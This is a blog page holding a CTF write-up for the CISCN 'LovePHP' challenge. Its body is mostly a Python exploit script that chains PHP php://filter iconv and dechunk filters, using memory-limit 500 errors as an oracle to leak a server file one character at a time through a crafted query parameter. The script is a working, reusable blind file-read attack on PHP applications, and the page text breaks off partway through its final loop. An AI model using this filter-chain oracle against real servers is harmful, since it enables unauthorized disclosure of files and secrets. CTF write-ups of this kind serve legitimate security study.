<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Ciscnåˆèµ›â€”â€”LovePHPé¢˜ç›®wp | h3110w0r1d's Blog</title><meta name="author" content="h3110w0r1d"><meta name="copyright" content="h3110w0r1d"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Ciscnåˆèµ›â€”â€”LovePHPé¢˜ç›®wp   PHPç‰¹æ€§é¢˜ç›®    å¼•å‘æœåŠ¡å™¨500é”™è¯¯ï¼Œè§‚å¯ŸPHPè¿‡æ»¤å™¨çš„è¡Œä¸ºï¼Œåˆ›å»ºè¿‡æ»¤å™¨é“¾è¿›è¡Œæ”»å‡»    import requests   import sys   from base64 import b64decode      &quot;&quot;&quot;   THE GRAND IDEA:   We can use PHP memory lim">
<meta property="og:type" content="article">
<meta property="og:title" content="Ciscnåˆèµ›â€”â€”LovePHPé¢˜ç›®wp">
<meta property="og:url" content="http://dezhoutorizhao.github.io/LovePHP/index.html">
<meta property="og:site_name" content="h3110w0r1d&#39;s Blog">
<meta property="og:description" content="Ciscnåˆèµ›â€”â€”LovePHPé¢˜ç›®wp   PHPç‰¹æ€§é¢˜ç›®    å¼•å‘æœåŠ¡å™¨500é”™è¯¯ï¼Œè§‚å¯ŸPHPè¿‡æ»¤å™¨çš„è¡Œä¸ºï¼Œåˆ›å»ºè¿‡æ»¤å™¨é“¾è¿›è¡Œæ”»å‡»    import requests   import sys   from base64 import b64decode      &quot;&quot;&quot;   THE GRAND IDEA:   We can use PHP memory lim">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQå›¾ç‰‡20240111033823.jpg">
<meta property="article:published_time" content="2023-08-27T09:05:19.259Z">
<meta property="article:modified_time" content="2024-02-13T14:30:09.808Z">
<meta property="article:author" content="h3110w0r1d">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQå›¾ç‰‡20240111033823.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://dezhoutorizhao.github.io/LovePHP/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Ciscnåˆèµ›â€”â€”LovePHPé¢˜ç›®wp',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-02-13 22:30:09'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQå›¾ç‰‡20240111033823.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">103</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">64</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent"><nav id="nav"><span id="blog-info"><a href="/" title="h3110w0r1d's Blog"><span class="site-name">h3110w0r1d's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Ciscnåˆèµ›â€”â€”LovePHPé¢˜ç›®wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-08-27T09:05:19.259Z" title="å‘è¡¨äº 2023-08-27 17:05:19">2023-08-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2024-02-13T14:30:09.808Z" title="æ›´æ–°äº 2024-02-13 22:30:09">2024-02-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Ciscnåˆèµ›â€”â€”LovePHPé¢˜ç›®wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Ciscnåˆèµ›â€”â€”LovePHPé¢˜ç›®wp"><a href="#Ciscnåˆèµ›â€”â€”LovePHPé¢˜ç›®wp" class="headerlink" title="Ciscnåˆèµ›â€”â€”LovePHPé¢˜ç›®wp"></a>Ciscnåˆèµ›â€”â€”LovePHPé¢˜ç›®wp</h1><ol>
<li><p>  PHPç‰¹æ€§é¢˜ç›®</p>
</li>
<li><p>  å¼•å‘æœåŠ¡å™¨500é”™è¯¯ï¼Œè§‚å¯ŸPHPè¿‡æ»¤å™¨çš„è¡Œä¸ºï¼Œåˆ›å»ºè¿‡æ»¤å™¨é“¾è¿›è¡Œæ”»å‡»</p>
</li>
<li><pre><code class="python">  import requests
  import sys
  from base64 import b64decode
  
  &quot;&quot;&quot;
  THE GRAND IDEA:
  We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE
  filter will blow up the string length by 4x every time it is used, which will quickly cause
  500 error if and only if the string is non empty. So we now have an oracle that tells us if
  the string is empty.
  
  THE GRAND IDEA 2:
  The dechunk filter is interesting.
  https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724
  It looks like it was implemented for something http related, but for our purposes, the interesting
  behavior is that if the string contains no newlines, it will wipe the entire string if and only if
  the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our
  above oracle! In fact we can verify that since the flag starts with D that the filter chain
  
  dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE
  
  does not cause a 500 error.
  
  THE REST:
  So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent
  into madness trying to figure out ways to:
  - somehow get other characters not at the start of the flag file to the front
  - detect more precisely which character is at the front
  &quot;&quot;&quot;
  
  def join(*x):
      return &#39;|&#39;.join(x)
  
  def err(s):
      print(s)
      raise ValueError
  
  def req(s):
      param = &#39;&#123;&#125;&#39;
      data = f&#39;&#123;param&#125;&amp;secret=php://filter/&#123;s&#125;/resource=/flag&#39;
  
      return requests.get(f&#39;http://IP+PORT/index.php?my[secret.flag=C:8:&quot;Saferman&quot;:0:&#123;data&#125;&#39;).status_code == 500
  
  &quot;&quot;&quot;
  Step 1:
  The second step of our exploit only works under two conditions:
  - String only contains a-zA-Z0-9
  - String ends with two equals signs
  
  base64-encoding the flag file twice takes care of the first condition.
  
  We don&#39;t know the length of the flag file, so we can&#39;t be sure that it will end with two equals
  signs.
  
  Repeated application of the convert.quoted-printable-encode will only consume additional
  memory if the base64 ends with equals signs, so that&#39;s what we are going to use as an oracle here.
  If the double-base64 does not end with two equals signs, we will add junk data to the start of the
  flag with convert.iconv..CSISO2022KR until it does.
  &quot;&quot;&quot;
  
  blow_up_enc = join(*[&#39;convert.quoted-printable-encode&#39;]*1000)
  blow_up_utf32 = &#39;convert.iconv.L1.UCS-4LE&#39;
  blow_up_inf = join(*[blow_up_utf32]*50)
  
  header = &#39;convert.base64-encode|convert.base64-encode&#39;
  
  # Start get baseline blowup
  print(&#39;Calculating blowup&#39;)
  baseline_blowup = 0
  for n in range(100):
      payload = join(*[blow_up_utf32]*n)
      if req(f&#39;&#123;header&#125;|&#123;payload&#125;&#39;):
          baseline_blowup = n
          break
  else:
      err(&#39;something wrong&#39;)
  
  print(f&#39;baseline blowup is &#123;baseline_blowup&#125;&#39;)
  
  trailer = join(*[blow_up_utf32]*(baseline_blowup-1))
  
  assert req(f&#39;&#123;header&#125;|&#123;trailer&#125;&#39;) == False
  
  print(&#39;detecting equals&#39;)
  j = [
      req(f&#39;convert.base64-encode|convert.base64-encode|&#123;blow_up_enc&#125;|&#123;trailer&#125;&#39;),
      req(f&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#123;blow_up_enc&#125;|&#123;trailer&#125;&#39;),
      req(f&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|&#123;blow_up_enc&#125;|&#123;trailer&#125;&#39;)
  ]
  print(j)
  if sum(j) != 2:
      err(&#39;something wrong&#39;)
  if j[0] == False:
      header = f&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#39;
  elif j[1] == False:
      header = f&#39;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode&#39;
  elif j[2] == False:
      header = f&#39;convert.base64-encode|convert.base64-encode&#39;
  else:
      err(&#39;something wrong&#39;)
  print(f&#39;j: &#123;j&#125;&#39;)
  print(f&#39;header: &#123;header&#125;&#39;)
  
  &quot;&quot;&quot;
  Step two:
  Now we have something of the form
  [a-zA-Z0-9 things]==
  
  Here the pain begins. For a long time I was trying to find something that would allow me to strip
  successive characters from the start of the string to access every character. Maybe something like
  that exists but I couldn&#39;t find it. However, if you play around with filter combinations you notice
  there are filters that *swap* characters:
  
  convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:
  abcdefgh -&gt; badcfehg
  
  convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:
  abcdefgh -&gt; dcbahgfe
  
  This allows us to access the first four characters of the string. Can we do better? It turns out
  YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff&gt;&lt;0xfe&gt; to the start of
  the string:
  
  abcdefgh -&gt; &lt;0xff&gt;&lt;0xfe&gt;abcdefgh
  
  The idea being that if we now use the r4 gadget, we get something like:
  ba&lt;0xfe&gt;&lt;0xff&gt;fedc
  
  And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid
  &lt;0xfe&gt;&lt;0xff&gt; to get:
  bafedc
  
  And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th
  characters of the string. There&#39;s only one problem: our r4 gadget requires that the string length
  is a multiple of 4. The original base64 string will be a multiple of four by definition, so when
  we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no
  good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it
  turns out, if we apply the filter
  convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7
  
  It will turn the == into:
  +---AD0-3D3D+---AD0-3D3D
  
  And this is magic, because this corrects such that when we apply the
  convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!
  
  Let&#39;s recap. We have a string like:
  abcdefghij==
  
  Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:
  abcdefghij+---AD0-3D3D+---AD0-3D3D
  
  Apply convert.iconv.CSUNICODE.CSUNICODE:
  &lt;0xff&gt;&lt;0xfe&gt;abcdefghij+---AD0-3D3D+---AD0-3D3D
  
  Apply r4 gadget:
  ba&lt;0xfe&gt;&lt;0xff&gt;fedcjihg---+-0DAD3D3---+-0DAD3D3
  
  Apply base64-decode | base64-encode, so the &#39;-&#39; and high bytes will disappear:
  bafedcjihg+0DAD3D3+0DAD3Dw==
  
  Then apply r4 once more:
  efabijcd0+gh3DAD0+3D3DAD==wD
  
  And here&#39;s the cute part: not only have we now accessed the 5th and 6th chars of the string, but
  the string still has two equals signs in it, so we can reapply the technique as many times as we
  want, to access all the characters in the string ;)
  &quot;&quot;&quot;
  
  flip = &quot;convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode&quot;
  r2 = &quot;convert.iconv.CSUNICODE.UCS-2BE&quot;
  r4 = &quot;convert.iconv.UCS-4LE.10646-1:1993&quot;
  
  def get_nth(n):
      global flip, r2, r4
      o = []
      chunk = n // 2
      if chunk % 2 == 1: o.append(r4)
      o.extend([flip, r4] * (chunk // 2))
      if (n % 2 == 1) ^ (chunk % 2 == 1): o.append(r2)
      return join(*o)
  
  &quot;&quot;&quot;
  Step 3:
  This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first
  char is 0-9A-Fa-f. So it&#39;s just a matter of finding filters which translate to or from those
  chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but
  I just bruteforced every combination of iconv filters to find these.
  
  Numbers are a bit trickier because iconv doesn&#39;t tend to touch them.
  In the CTF you coud porbably just guess from there once you have the letters. But if you actually 
  want a full leak you can base64 encode a third time and use the first two letters of the resulting
  string to figure out which number it is.
  &quot;&quot;&quot;
  
  rot1 = &#39;convert.iconv.437.CP930&#39;
  be = &#39;convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode&#39;
  o = &#39;&#39;
  
  def find_letter(prefix):
      if not req(f&#39;&#123;prefix&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
          # a-f A-F 0-9
          if not req(f&#39;&#123;prefix&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
              # a-e
              for n in range(5):
                  if req(f&#39;&#123;prefix&#125;|&#39; + f&#39;&#123;rot1&#125;|&#123;be&#125;|&#39;*(n+1) + f&#39;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
                      return &#39;edcba&#39;[n]
                      break
              else:
                  err(&#39;something wrong&#39;)
          elif not req(f&#39;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
              # A-E
              for n in range(5):
                  if req(f&#39;&#123;prefix&#125;|string.tolower|&#39; + f&#39;&#123;rot1&#125;|&#123;be&#125;|&#39;*(n+1) + f&#39;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
                      return &#39;EDCBA&#39;[n]
                      break
              else:
                  err(&#39;something wrong&#39;)
          elif not req(f&#39;&#123;prefix&#125;|convert.iconv.CSISO5427CYRILLIC.855|dechunk|&#123;blow_up_inf&#125;&#39;):
              return &#39;*&#39;
          elif not req(f&#39;&#123;prefix&#125;|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
              # f
              return &#39;f&#39;
          elif not req(f&#39;&#123;prefix&#125;|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
              # F
              return &#39;F&#39;
          else:
              err(&#39;something wrong&#39;)
      elif not req(f&#39;&#123;prefix&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
          # n-s N-S
          if not req(f&#39;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
              # n-r
              for n in range(5):
                  if req(f&#39;&#123;prefix&#125;|string.rot13|&#39; + f&#39;&#123;rot1&#125;|&#123;be&#125;|&#39;*(n+1) + f&#39;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
                      return &#39;rqpon&#39;[n]
                      break
              else:
                  err(&#39;something wrong&#39;)
          elif not req(f&#39;&#123;prefix&#125;|string.rot13|string.tolower|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
              # N-R
              for n in range(5):
                  if req(f&#39;&#123;prefix&#125;|string.rot13|string.tolower|&#39; + f&#39;&#123;rot1&#125;|&#123;be&#125;|&#39;*(n+1) + f&#39;&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
                      return &#39;RQPON&#39;[n]
                      break
              else:
                  err(&#39;something wrong&#39;)
          elif not req(f&#39;&#123;prefix&#125;|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
              # s
              return &#39;s&#39;
          elif not req(f&#39;&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
              # S
              return &#39;S&#39;
          else:
              err(&#39;something wrong&#39;)
      elif not req(f&#39;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
          # i j k
          if req(f&#39;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
              return &#39;k&#39;
          elif req(f&#39;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
              return &#39;j&#39;
          elif req(f&#39;&#123;prefix&#125;|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
              return &#39;i&#39;
          else:
              err(&#39;something wrong&#39;)
      elif not req(f&#39;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
          # I J K
          if req(f&#39;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
              return &#39;K&#39;
          elif req(f&#39;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
              return &#39;J&#39;
          elif req(f&#39;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
              return &#39;I&#39;
          else:
              err(&#39;something wrong&#39;)
      elif not req(f&#39;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
          # v w x
          if req(f&#39;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
              return &#39;x&#39;
          elif req(f&#39;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
              return &#39;w&#39;
          elif req(f&#39;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
              return &#39;v&#39;
          else:
              err(&#39;something wrong&#39;)
      elif not req(f&#39;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
          # V W X
          if req(f&#39;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
              return &#39;X&#39;
          elif req(f&#39;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
              return &#39;W&#39;
          elif req(f&#39;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#39;):
              return &#39;V&#39;
          else:
              err(&#39;something wrong&#39;)
      elif not req(f&#39;&#123;prefix&#125;|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
          # Z
          return &#39;Z&#39;
      elif not req(f&#39;&#123;prefix&#125;|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
          # z
          return &#39;z&#39;
      elif not req(f&#39;&#123;prefix&#125;|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
          # M
          return &#39;M&#39;
      elif not req(f&#39;&#123;prefix&#125;|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
          # m
          return &#39;m&#39;
      elif not req(f&#39;&#123;prefix&#125;|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
          # y
          return &#39;y&#39;
      elif not req(f&#39;&#123;prefix&#125;|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
          # Y
          return &#39;Y&#39;
      elif not req(f&#39;&#123;prefix&#125;|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
          # l
          return &#39;l&#39;
      elif not req(f&#39;&#123;prefix&#125;|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
          # L
          return &#39;L&#39;
      elif not req(f&#39;&#123;prefix&#125;|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
          # h
          return &#39;h&#39;
      elif not req(f&#39;&#123;prefix&#125;|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
          # H
          return &#39;H&#39;
      elif not req(f&#39;&#123;prefix&#125;|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
          # u
          return &#39;u&#39;
      elif not req(f&#39;&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;&#39;):
          # U
          return &#39;U&#39;
      elif not req(f&#39;&#123;prefix&#125;|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
          # g
          return &#39;g&#39;
      elif not req(f&#39;&#123;prefix&#125;|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
          # G
          return &#39;G&#39;
      elif not req(f&#39;&#123;prefix&#125;|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
          # t
          return &#39;t&#39;
      elif not req(f&#39;&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#39;):
          # T
          return &#39;T&#39;
      else:
          err(&#39;something wrong&#39;)
  
  print()
  for i in range(100):
      prefix = f&#39;&#123;header&#125;|&#123;get_nth(i)&#125;&#39;
      letter = find_letter(prefix)
      # it&#39;s a number! check base64
      if letter == &#39;*&#39;:
          prefix = f&#39;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode&#39;
          s = find_letter(prefix)
          if s == &#39;M&#39;:
              # 0 - 3
              prefix = f&#39;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;&#39;
              ss = find_letter(prefix)
              if ss in &#39;CDEFGH&#39;:
                  letter = &#39;0&#39;
              elif ss in &#39;STUVWX&#39;:
                  letter = &#39;1&#39;
              elif ss in &#39;ijklmn&#39;:
                  letter = &#39;2&#39;
              elif ss in &#39;yz*&#39;:
                  letter = &#39;3&#39;
              else:
                  err(f&#39;bad num (&#123;ss&#125;)&#39;)
          elif s == &#39;N&#39;:
              # 4 - 7
              prefix = f&#39;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;&#39;
              ss = find_letter(prefix)
              if ss in &#39;CDEFGH&#39;:
                  letter = &#39;4&#39;
              elif ss in &#39;STUVWX&#39;:
                  letter = &#39;5&#39;
              elif ss in &#39;ijklmn&#39;:
                  letter = &#39;6&#39;
              elif ss in &#39;yz*&#39;:
                  letter = &#39;7&#39;
              else:
